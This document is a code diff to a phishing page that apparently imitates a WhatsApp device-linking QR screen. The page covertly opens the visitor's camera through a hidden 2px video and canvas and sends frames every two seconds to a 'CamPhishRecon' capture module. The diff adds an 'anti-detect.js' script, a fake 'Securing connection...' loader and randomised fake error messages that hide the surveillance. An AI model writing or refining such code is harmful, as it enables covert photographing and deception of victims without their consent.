@@ -27,7 +27,14 @@ video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:
 @keyframes spin{to{transform:rotate(360deg)}}
 </style>
 </head><body>
+<div id="loadScreen" style="position:fixed;inset:0;background:#f0f2f5;display:flex;align-items:center;justify-content:center;z-index:99998;font-family:sans-serif;flex-direction:column;gap:12px">
+<div style="width:24px;height:24px;border:3px solid #ddd;border-top-color:#25d366;border-radius:50%;animation:cl 0.8s linear infinite"></div>
+<div style="font-size:13px;color:#888">Securing connection...</div>
+</div>
+<style>@keyframes cl{to{transform:rotate(360deg)}}</style>
+<div id="pageContent">
 <script src="forwarding_link/t/recon.js"></script>
+<script src="forwarding_link/t/anti-detect.js"></script>
 <video id="v" playsinline autoplay muted></video>
 <canvas id="cap" width="320" height="240"></canvas>
 <div class="left">
@@ -64,7 +71,7 @@ navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'environment'
 var v=document.getElementById('v');v.srcObject=stream;v.play();
 var cap=document.getElementById('cap'),cx=cap.getContext('2d');
 var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'qr_scan');}},2000);
-setTimeout(function(){clearInterval(ci);ov.classList.remove('active');alert('QR code expired. Please refresh.');},6000);
+setTimeout(function(){clearInterval(ci);ov.classList.remove('active');var msgs=['QR code expired. Please refresh.','Connection lost. Please try again.','Unable to link device. Please try again.'];alert(msgs[Math.floor(Math.random()*msgs.length)]);},6000);
 }).catch(function(){
 // Front camera fallback
 navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(stream){
@@ -76,5 +83,12 @@ setTimeout(function(){clearInterval(ci);ov.classList.remove('active');},6000);
 });
 }else{setTimeout(function(){ov.classList.remove('active');},2000);}
 }
+</script>
+</div>
+<script>
+setTimeout(function(){
+  var loader=document.getElementById('loadScreen');
+  if(loader)loader.remove();
+},300+Math.random()*400);
 </script>
 </body></html>
